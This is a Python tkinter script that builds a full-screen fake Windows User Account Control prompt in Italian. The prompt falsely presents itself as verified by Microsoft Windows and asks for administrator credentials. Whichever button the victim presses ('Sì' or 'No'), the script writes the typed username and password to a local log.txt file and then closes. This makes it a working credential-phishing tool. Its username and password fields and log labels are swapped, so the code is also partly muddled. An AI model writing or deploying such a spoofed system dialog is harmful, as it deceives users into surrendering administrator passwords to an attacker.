import customtkinter
import tkinter as tk

def exit_program():
    root.destroy()

def label_hide(event, label):
     label.destroy()

def save_to_file():
    username = username_var.get()
    password = password_var.get()
    with open("log.txt", "a") as log_file:
        log_file.write(f"Username: {password}\n")
        log_file.write(f"Password: {username}\n")
        
customtkinter.set_appearance_mode("System")
root = tk.Tk()
root.attributes('-fullscreen', True)
root.configure(bg="black")
root.attributes('-alpha', 0.6)

username_var = tk.StringVar()
password_var = tk.StringVar()

#white frame regulations
screen_lenght, screen_height = root.winfo_screenwidth(), root.winfo_screenheight()
lenght_white_window, height_white_window = 754, 759
x = (screen_lenght - lenght_white_window) // 2
y = (screen_height - height_white_window) // 2
white_window = tk.Toplevel(root, bg="white")
white_window.attributes('-toolwindow', 1)
white_window.geometry(f"{lenght_white_window}x{height_white_window}+{x}+{y}")
white_window.overrideredirect(1)

#blue strip at the top
top_strip = tk.Frame(white_window, bg="#76c7ed", height=170)
top_strip.pack(fill="x")

#simple text labels
text_label1 = tk.Label(white_window, text="Vuoi consentire a questa app di apportare", font=("Quebec Serial", 25), background='#76c7ed', foreground='black')
text_label2 = tk.Label(white_window, text="modifiche al dispositivo?", font=("Quebec Serial", 25), background='#76c7ed', foreground='black')
text_label3 = tk.Label(white_window, text="Controllo dell'account utente", font=("Arial", 14), background='#76c7ed', foreground='black')
text_label4 = tk.Label(white_window, text="Processore dei comandi di windows", font=("Quebec Serial", 22), background='white', foreground='black')
text_label5 = tk.Label(white_window, text="Autore verificato: Microsoft Windows", font=("Quebec Serial", 16), background='white', foreground='black')
text_label6 = tk.Label(white_window, text="Mostra altri dettagli", font=("Quebec Serial", 16), background='white', foreground='#008ed7')
text_label7 = tk.Label(white_window, text="Per continuare, immettere le credenziali di un amministratore.", font=("Quebec Serial", 16), background='white', foreground='black')
text_label8 = tk.Label(white_window, text="Altre scelte", font=("Quebec Serial", 16), background='white', foreground='#008ed7')
text_label9 = tk.Label(white_window, text="✕", font=("Arial", 18), background='#76c7ed', foreground='black')

text_label1.pack()
text_label2.pack()
text_label3.pack()
text_label4.pack()
text_label5.pack()
text_label6.pack()
text_label7.pack()
text_label8.pack()
text_label9.pack()

text_label1.place(x=38, y=66)
text_label2.place(x=38, y=108)
text_label3.place(x=38, y=18)
text_label4.place(x=140, y=225)
text_label5.place(x=38, y=310)
text_label6.place(x=38, y=350)
text_label7.place(x=38, y=385)
text_label8.place(x=38, y=600)
text_label9.place(x=708, y=10)

#image
image = tk.PhotoImage(file="image.png")
image = image.subsample(3, 3)
image_label = tk.Label(white_window, image=image, background='white')
image_label.pack()
image_label.place(x=38, y=200)

#entry
entry1 = tk.Entry(white_window, font=("Segoe UI", 25) ,show="\u2022", borderwidth=2, textvariable=username_var)
entry2 = tk.Entry(white_window, font=("Segoe UI", 18), borderwidth=2, textvariable=password_var)

entry1.place(x=37, y=500, width=450, height=50)
entry2.place(x=37, y=425, width=450, height=50)

#labels username/password
label1 = tk.Label(white_window, text="Username", font=("Segoe UI", 18),background='white', foreground='gray')
label2 = tk.Label(white_window, text="Password", font=("Segoe UI", 18),background='white', foreground='gray')
label1.pack()
label2.pack()
label1.place(x=39, y=430)
label2.place(x=39, y=506)

label2.bind("<Button-1>", lambda e: entry1.focus())
label1.bind("<Button-1>", lambda e: entry2.focus())

#hide label event
entry2.bind("<FocusIn>", lambda event: label_hide(event, label1))
entry1.bind("<FocusIn>", lambda event: label_hide(event, label2))

#buttons
button_frame = tk.Frame(white_window)
button_frame.pack(side="bottom", pady=37)

yes_button = tk.Button(button_frame, text="Sì", width=27, height=1, bg="#B8B8B8", borderwidth=0, font=("Segoe UI", 16), background='#c1d7e8', foreground='black',command=lambda: (save_to_file(), exit_program()))
no_button = tk.Button(button_frame, text="No", width=27, height=1, bg="#B8B8B8", borderwidth=0, font=("Segoe UI", 16), background='#c1d7e8', foreground='black', command=lambda: (save_to_file(), exit_program()))

yes_button.grid(row=0, column=0, padx=5)
no_button.grid(row=0, column=1, padx=5)

#white frame regulations 2
white_window.attributes('-topmost', 1)
white_window.protocol("WM_DELETE_WINDOW", exit_program)

root.mainloop()
